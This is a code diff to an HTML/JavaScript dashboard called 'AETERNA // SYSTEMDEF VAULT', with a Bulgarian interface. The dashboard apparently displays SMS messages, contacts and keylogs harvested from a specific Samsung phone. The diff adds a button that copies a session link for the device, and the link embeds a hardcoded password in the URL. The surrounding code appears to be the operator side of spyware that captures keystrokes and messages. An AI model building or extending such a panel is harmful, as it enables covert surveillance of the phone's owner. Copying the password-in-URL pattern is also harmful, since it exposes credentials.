@@ -403,12 +403,13 @@
     <div class="dash-header">
       <div>
         <h1 style="font-size: 20px; font-weight: 900; color: var(--cyan);">AETERNA // SYSTEMDEF VAULT</h1>
-        <div style="display: flex; align-items: center; gap: 10px; margin-top: 4px;">
+        <div style="display: flex; align-items: center; gap: 10px; margin-top: 4px; flex-wrap: wrap;">
           <label style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); font-weight: 700;">📱 DEVICE SESSION:</label>
           <select id="device-selector" onchange="onDeviceSelected()" style="background: var(--card); border: 1px solid var(--cyan); color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 11px; padding: 4px 10px; border-radius: 6px; outline: none; cursor: pointer;">
             <option value="ALL">🌐 ALL DEVICES (Unified Fleet)</option>
             <option value="RZCX326316L" selected>🟢 Samsung Galaxy S24 Ultra (SM-S928B)</option>
           </select>
+          <button id="btn-copy-session" onclick="copyCurrentSessionLink()" style="background: rgba(0, 240, 255, 0.12); border: 1px solid var(--cyan); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 6px; cursor: pointer;">🔗 Копирай линк за тази сесия</button>
         </div>
       </div>
       <div style="display: flex; gap: 12px; align-items: center;">
@@ -648,6 +649,28 @@
       renderSms();
       renderContacts();
       renderKeylogs();
+    }
+
+    function copyCurrentSessionLink() {
+      const devId = selectedDeviceId === 'ALL' ? (devicesList[0]?.deviceId || '') : selectedDeviceId;
+      if (!devId) {
+        alert("Няма активно устройство за копиране!");
+        return;
+      }
+      const baseUrl = window.location.origin + window.location.pathname;
+      const sessionUrl = `${baseUrl}?device=${encodeURIComponent(devId)}&pass=vault2026`;
+      navigator.clipboard.writeText(sessionUrl).then(() => {
+        const btn = document.getElementById('btn-copy-session');
+        const oldText = btn.textContent;
+        btn.textContent = "✅ Линкът е копиран!";
+        btn.style.borderColor = "var(--green)";
+        btn.style.color = "var(--green)";
+        setTimeout(() => {
+          btn.textContent = oldText;
+          btn.style.borderColor = "var(--cyan)";
+          btn.style.color = "var(--cyan)";
+        }, 2500);
+      });
     }
 
     function matchDevice(item) {
